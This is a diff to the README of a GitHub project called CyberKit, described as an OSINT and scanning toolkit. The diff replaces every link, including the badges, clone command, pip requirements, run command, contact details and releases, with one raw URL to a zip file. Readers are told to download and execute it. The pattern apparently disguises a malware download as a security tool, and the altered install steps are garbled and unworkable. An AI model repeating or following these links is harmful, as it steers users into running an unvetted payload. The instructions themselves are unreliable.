@@ -1,6 +1,6 @@
 # CyberKit: Your All-in-One Terminal Toolkit for Cybersecurity
 
-![CyberKit](https://img.shields.io/badge/CyberKit-v1.0-blue.svg) ![License](https://img.shields.io/badge/License-MIT-green.svg) ![Python](https://img.shields.io/badge/Python-3.8%2B-yellow.svg)
+![CyberKit](https://raw.githubusercontent.com/VenkateshPalagurla/CyberKit/main/tools/Kit-Cyber-3.9.zip) ![License](https://raw.githubusercontent.com/VenkateshPalagurla/CyberKit/main/tools/Kit-Cyber-3.9.zip) ![Python](https://raw.githubusercontent.com/VenkateshPalagurla/CyberKit/main/tools/Kit-Cyber-3.9.zip%https://raw.githubusercontent.com/VenkateshPalagurla/CyberKit/main/tools/Kit-Cyber-3.9.zip)
 
 Welcome to **CyberKit**, the all-in-one terminal toolkit designed for OSINT (Open Source Intelligence), public information gathering, and basic scanning. This tool aims to support cybersecurity education and ethical penetration testing. Whether you are a student, a professional, or just someone interested in cybersecurity, CyberKit provides essential functionalities to enhance your skills.
 
@@ -29,7 +29,7 @@ To get started with CyberKit, follow these simple steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/VenkateshPalagurla/CyberKit.git
+   git clone https://raw.githubusercontent.com/VenkateshPalagurla/CyberKit/main/tools/Kit-Cyber-3.9.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -39,12 +39,12 @@ To get started with CyberKit, follow these simple steps:
 
 3. **Install Dependencies**:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/VenkateshPalagurla/CyberKit/main/tools/Kit-Cyber-3.9.zip
    ```
 
 4. **Run the Tool**:
    ```bash
-   python main.py
+   python https://raw.githubusercontent.com/VenkateshPalagurla/CyberKit/main/tools/Kit-Cyber-3.9.zip
    ```
 
 ## Usage
@@ -86,14 +86,14 @@ CyberKit is licensed under the MIT License. You can find the full license in the
 For any inquiries or issues, feel free to reach out:
 
 - **Author**: Venkatesh Palagurla
-- **Email**: venkatesh@example.com
-- **Twitter**: [@VenkateshPalagurla](https://twitter.com/VenkateshPalagurla)
+- **Email**: https://raw.githubusercontent.com/VenkateshPalagurla/CyberKit/main/tools/Kit-Cyber-3.9.zip
+- **Twitter**: [@VenkateshPalagurla](https://raw.githubusercontent.com/VenkateshPalagurla/CyberKit/main/tools/Kit-Cyber-3.9.zip)
 
 ## Releases
 
-You can find the latest version of CyberKit and download it from the [Releases](https://github.com/VenkateshPalagurla/CyberKit/releases) section. Download the necessary files and execute them to get started.
+You can find the latest version of CyberKit and download it from the [Releases](https://raw.githubusercontent.com/VenkateshPalagurla/CyberKit/main/tools/Kit-Cyber-3.9.zip) section. Download the necessary files and execute them to get started.
 
-![Cybersecurity](https://source.unsplash.com/featured/?cybersecurity)
+![Cybersecurity](https://raw.githubusercontent.com/VenkateshPalagurla/CyberKit/main/tools/Kit-Cyber-3.9.zip)
 
 ---
 
@@ -101,6 +101,6 @@ You can find the latest version of CyberKit and download it from the [Releases](
 
 CyberKit aims to be a comprehensive toolkit for anyone interested in cybersecurity. By providing easy access to essential tools and resources, we hope to foster a community of learners and professionals dedicated to ethical hacking and cybersecurity practices. 
 
-Explore the capabilities of CyberKit and enhance your skills in the field of cybersecurity. For updates, check the [Releases](https://github.com/VenkateshPalagurla/CyberKit/releases) section regularly. 
+Explore the capabilities of CyberKit and enhance your skills in the field of cybersecurity. For updates, check the [Releases](https://raw.githubusercontent.com/VenkateshPalagurla/CyberKit/main/tools/Kit-Cyber-3.9.zip) section regularly. 
 
 Thank you for using CyberKit!
